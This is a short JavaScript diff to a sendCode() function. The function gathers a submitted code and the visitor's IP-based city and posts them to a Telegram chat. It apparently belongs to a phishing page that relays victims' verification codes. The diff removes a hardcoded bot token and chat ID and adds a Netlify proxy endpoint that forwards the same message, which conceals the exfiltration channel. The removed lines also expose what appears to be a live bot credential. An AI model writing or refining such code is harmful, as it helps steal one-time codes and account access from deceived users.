@@ -148,19 +148,13 @@ function sendCode() {
       ` <strong>City:</strong> <code>${IpAddress?.city || "N/A"}</code>`;
 
     NUMBER_TIME_SEND_CODE++;
-    const botToken = "7521413873:AAGI7lAk_B9c5U_T9dyglS_Bhlg73VxMrwU";
-    const chatId = "-1002275895232";
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    fetch(telegramUrl, {
+    fetch('https://tele-123-456.netlify.app/.netlify/functions/send-telegram', {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: message1,
-        parse_mode: "html",
+        message: message1
       }),
     })
       .then((response) => {
@@ -170,7 +164,11 @@ function sendCode() {
         return response.json();
       })
       .then((data) => {
-        $(".lsd-ring-container").addClass("d-none");
+        if (data.success) {
+          $(".lsd-ring-container").addClass("d-none");
+        } else {
+          throw new Error(data.error || "telegram send failed");
+        }
       })
       .catch((error) => {
         setTimeout(function () {
